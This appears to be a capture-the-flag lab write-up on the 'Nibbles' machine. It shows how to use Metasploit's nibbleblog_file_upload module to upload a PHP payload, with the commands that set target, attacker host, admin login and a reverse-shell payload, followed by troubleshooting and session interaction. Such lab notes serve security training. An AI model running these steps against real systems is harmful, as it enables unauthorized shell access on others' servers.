# 16. Nibbles — Automated Exploitation via Metasploit

**Module:** `exploit/multi/http/nibbleblog_file_upload`

## Overview

This Metasploit module automates the same arbitrary file upload vulnerability exploited manually via Nibbleblog's **My Image** plugin. Once provided with valid administrative credentials and the target path, Metasploit automatically handles authentication, uploads the malicious PHP payload, and triggers execution to return a reverse shell.

---

## Setup & Execution Steps

1. Launch the Metasploit Framework console:
   ```bash
   msfconsole
   ```
2. Search for the relevant Nibbleblog exploit module:
   ```bash
   search nibbleblog
   ```
3. Load the module:
   ```bash
   use exploit/multi/http/nibbleblog_file_upload
   ```
4. Configure the required module and payload options:
   ```bash
   set RHOSTS <TARGET_IP>
   set LHOST <ATTACKER_TUN0_IP>
   set USERNAME admin
   set PASSWORD <REDACTED>
   set TARGETURI /nibbleblog/
   set payload generic/shell_reverse_tcp
   ```
   *(Note: Setting `TARGETURI` to `/nibbleblog/` is mandatory because the application is hosted inside a subdirectory rather than the web root `/`.)*
5. Verify all parameters before launching:
   ```bash
   show options
   ```
6. Execute the exploit:
   ```bash
   exploit
   ```

---

## Troubleshooting & Issues Encountered

| Error / Observation | Root Cause | Resolution |
| :--- | :--- | :--- |
| `Unable to login. Verify USERNAME/PASSWORD or TARGETURI` | `TARGETURI` was left at its default value (`/`) instead of the actual CMS path (`/nibbleblog/`) | Updated `TARGETURI` to `/nibbleblog/` |
| `Command shell session is not valid and will be closed` | Unstable VPN connection causing high latency/jitter and dropped packets | Checked VPN stability/MTU settings and re-ran the exploit |
| Session opened and remained active | Improved tunnel stability allowed the reverse shell connection to persist | Interacted with the active session normally |

---

## Interacting with the Shell Session

Once the exploit succeeds and opens a background session, attach to it and verify execution privileges:

```bash
sessions -i <SESSION_ID>
id
```

Output showing `uid=1001(nibbler)` confirms shell access on the target host.

---

## Key Takeaway

Both the manual exploitation workflow and the Metasploit module abuse the **exact same underlying flaw**—Metasploit simply accelerates the process through automation. Mastering the manual approach first is essential (especially for certification exams that restrict automated exploitation tools), while Metasploit provides speed and efficiency during real-world penetration tests.
